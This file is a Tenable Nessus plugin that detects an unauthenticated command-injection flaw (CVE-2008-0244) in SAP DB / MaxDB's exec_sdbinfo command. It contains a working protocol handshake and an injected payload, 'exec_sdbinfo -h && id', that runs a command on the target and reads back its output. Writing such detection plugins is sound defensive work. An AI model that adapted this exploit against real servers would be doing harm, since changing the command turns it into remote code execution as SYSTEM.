#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29924);
  script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2016/11/02 14:37:09 $");

  script_cve_id("CVE-2008-0244");
  script_bugtraq_id(27206);
  script_osvdb_id(40210);
  script_xref(name:"EDB-ID", value:"4877");
  script_xref(name:"Secunia", value:"28409");

  script_name(english:"SAP DB / MaxDB Cons Program Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via exec_sdbinfo");

  script_set_attribute(attribute:"synopsis", value:"The remote database service allows execution of arbitrary commands.");
  script_set_attribute(attribute:"description", value:
"The version of SAP DB / MaxDB installed on the remote host fails to
sanitize user-supplied input to the 'show' and 'exec_sdbinfo' commands
before passing it to a 'system()' call. An unauthenticated, remote
attacker can leverage this issue to execute arbitrary commands on the
affected host subject to the privileges under which the service
operates, which under Windows is SYSTEM.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jan/102");
  script_set_attribute(attribute:"see_also", value:"https://www.sdn.sap.com/irj/sdn/thread?threadID=697805&tstart=50" );
  script_set_attribute(attribute:"see_also", value:"http://maxdb.sap.com/webpts?wptsdetail=yes&ErrorType=0&ErrorID=1152820" );
  script_set_attribute(attribute:"solution", value:"Upgrade to MaxDB version 7.6.03 Build 15 (7.6.03.15) or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(20);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sap:maxdb");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Databases");
  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("sapdb_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/sap_db_vserver", 7210);
  exit(0);
}


include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");


port = get_service(svc:"sap_db_vserver", default:7210, exit_on_fail:TRUE);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);


os = get_kb_item("Host/OS");
if (os && "Windows" >< os) cmd = "ipconfig /all";
else cmd = "id";


# Establish a connection.
set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

db = raw_string(
  0x00, 0xc5, 0x09, 0x00, 0xc8, 0xf6, 0x08, 0x00,
  0x00, 0xe3, 0x0a, 0x00, 0xd4, 0x00, 0x00, 0x00
);

req =
  mkdword(0) +
  mkdword(0x5b03) +
  mkdword(1) +
  mkdword(0xffffffff) +
  mkdword(0x040000) +
  mkdword(0) +
  mkdword(0x3f0200) +
  mkdword(0x0904) +
  mkdword(0x4000) +
  mkdword(0x3fd0) +
  mkdword(0x4000) +
  mkdword(0x70) +
  db +
  mkbyte(7) + "I1016" + mkword(0x400) +
  mkdword(0x032a1c50) +
  mkword(0x0152) +
  mkbyte(0x09) +
  "pdbmsrv" +
  mkbyte(0x00);
req = insstr(req, mkdword(strlen(req)), 0, 3);
req = insstr(req, mkdword(strlen(req)), 20, 23);
send(socket:soc, data:req);

res = recv(socket:soc, length:4, min:4);
if (strlen(res) == 4)
{
  len = getdword(blob:res, pos:0) - 4;
  if (len >= 7 && len <= 65335)
  {
    res = recv(socket:soc, length:len, min:len);
    if (strlen(res) == len && getdword(blob:res, pos:0) == 0x5c03)
    {
      # Try to exploit the issue to run a command.
      exploit = string("exec_sdbinfo -h && ", cmd);

      req =
        mkdword(0) +
        mkdword(0x3f03) +
        mkdword(1) +
        mkdword(0x06cc) +
        mkdword(0x040000) +
        mkdword(0) +                         # size (to be filled in later)
        exploit +
        mkbyte(0x00);
      req = insstr(req, mkdword(strlen(req)), 0, 3);
      req = insstr(req, mkdword(strlen(req)), 20, 23);
      send(socket:soc, data:req);

      res = recv(socket:soc, length:4, min:4);
      if (strlen(res) == 4)
      {
        len = getdword(blob:res, pos:0) - 4;
        if (len >= 7 && len <= 65335)
        {
          res = recv(socket:soc, length:len, min:len);
          if (
            strlen(res) == len &&
            getdword(blob:res, pos:0) == 0x4003 &&
            'OK\n' >< res &&
            substr(exploit, 5)+'\n' >< res
          )
          {
            exploit = substr(exploit, 5);
            info = strstr(res, exploit+'\n') - (exploit+'\n');
            if (info && report_verbosity > 0)
            {
              report = '\n' + 'Nessus was able to run the following command on the remote host :' +
                       '\n' +
                       '\n' + '  ' + cmd +
                       '\n' +
                       '\n' + 'which produced the following output :' +
                       '\n' +
                       info;
              security_hole(port:port, extra:report);
            }
            else security_hole(port);
            close(soc);
            exit(0);
          }
        }
      }
    }
  }
}
close(soc);

audit(AUDIT_LISTEN_NOT_VULN, "SAP DB / MaxDB ", port);
